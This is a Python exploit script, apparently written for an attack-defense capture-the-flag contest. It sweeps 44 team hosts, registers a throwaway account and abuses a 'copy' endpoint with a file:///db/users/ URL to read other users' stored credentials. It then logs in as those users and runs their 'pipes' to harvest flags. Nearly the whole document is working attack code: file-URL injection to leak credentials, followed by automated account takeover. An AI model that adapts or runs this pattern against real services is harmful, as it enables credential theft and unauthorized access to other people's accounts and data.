import requests as req
import json
import re

def gentext(length):
    import random
    return ''.join([chr(random.randint(65, 90)) if random.randint(0, 1) else chr(random.randint(97, 122)) for _ in range(length)])

class Kozinaks:
    def __init__(self):
        self.sess = req.Session()
        self.id = 0

    def login(self, username, password):
        return self.sess.post('http://10.70.{}.2:9999/api/login/'.format(self.id), json={
            "username": username,
            "password": password
        }).text

    def register(self, username, password):
        return self.sess.post('http://10.70.{}.2:9999/api/register/'.format(self.id), json={
            "username": username,
            "password": password
        })

    def exec_kozi(self, pipe):
        return json.loads(self.sess.get('http://10.70.{}.2:9999/api/exec_kozi/{}/'.format(self.id, pipe)).text)['result']

    def get_pipes(self):
        return json.loads(self.sess.get('http://10.70.{}.2:9999/api/list/'.format(self.id)).text)['result']

    def copy_kozi(self, pipe):
        data = {"name": 'LifeTeam', "url": " file:///db/users/{}".format(pipe.split('_')[0])}
        r = self.sess.post('http://10.70.{}.2:9999/api/copy_kozi/'.format(self.id), json=data).text
        try:
            usercreds = json.loads(re.findall('{"username": ".*", "password": "[A-zA-Z0-9]+"}', r))[0]
            return usercreds
        except Exception:
            return False



    def start(self):
        FLAG_FORMAT = r"([A-Z0-9]{31}=)"
        creds = gentext(6)
        with req.Session() as self.sess:
            for self.id in range(1, 44 + 1):
                self.register(creds, creds)
                self.login(creds, creds)

                pipes = set(self.get_pipes())

                for pipe in pipes:
                    usercreds = self.copy_kozi(pipe)
                    if not usercreds:
                        continue

                    self.login(usercreds['username'], usercreds['password'])
                    if not len(re.findall(usercreds['username'], pipe)):
                        continue

                    result = self.exec_kozi(pipe)
                    if re.findall(FLAG_FORMAT, result):
                        print(result, flush=True)

if __name__ == '__main__':
    k = Kozinaks()
    k.start()